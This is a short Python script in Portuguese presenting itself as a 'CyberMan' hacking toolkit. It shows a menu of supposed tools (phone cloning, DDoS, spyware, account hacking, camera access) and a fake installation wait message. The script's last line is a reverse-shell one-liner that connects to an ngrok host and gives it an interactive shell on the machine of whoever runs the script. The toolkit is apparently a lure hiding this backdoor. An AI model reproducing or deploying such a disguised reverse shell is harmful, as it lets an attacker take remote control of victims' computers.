import os

try: import pyfiglet
except: os.system('pip install pyfiglet')

figlet = pyfiglet.figlet_format("CyberMan", font="slant")

print('''
 == Ferramenta desenvolvida por ==
 {}
[1] Puxar dados
[2] Clonar telefone
[3] DDoS
[4] Pack de rastreamento (IP, telefone, etc)
[5] Gerador de virus espiao (spyware)
[6] Hackear contas
[7] Puxar camera por IP
[8] Puxar camera por telefone
[9] Puxar IP por telefone
[10] Outras 50+ ferramentas hacker
[11] Cursos crackeados de hacking
[99] Sair
'''.format(figlet))

print ('''
 [!] Aguarde enquanto a ferramenta esta sendo instalada. (Esse processo pode levar alguns longos minutos)
 OBS: Cancelar durante a instalacao pode prejudicar a ferramenta toda! Sendo necessario a reinstalacao.
''')

python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",17985));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
